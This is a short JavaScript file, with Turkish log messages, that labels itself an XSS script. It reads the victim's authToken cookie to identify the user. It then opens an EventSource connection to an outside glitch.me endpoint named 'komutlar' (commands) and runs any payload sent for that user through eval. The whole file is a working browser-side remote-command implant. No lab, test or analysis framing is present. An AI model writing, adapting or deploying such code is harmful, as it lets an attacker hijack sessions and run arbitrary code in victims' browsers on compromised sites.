console.log('XSS scripti yüklendi');

const getUsername = () => {
    const cookies = document.cookie.split(';');
    console.log('Çerezler:', document.cookie);
    for (let cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === 'authToken') {
            console.log('authToken:', value);
            return value.split('_')[0];
        }
    }
    return null;
};

const username = getUsername();
console.log('Username:', username);

const eventSource = new EventSource('https://tortoiseshell-bramble-day.glitch.me/komutlar');
eventSource.onmessage = (event) => {
    console.log('Gelen veri:', event.data);
    const data = JSON.parse(event.data);
    if (data.username === username && data.payload) {
        console.log('Payload çalıştırılıyor:', data.payload);
        eval(data.payload); // Payload’u çalıştır
    }
};
eventSource.onerror = (err) => {
    console.log('SSE hatası! Detay:', err);
};
eventSource.onopen = () => {
    console.log('SSE bağlantısı açıldı');
};
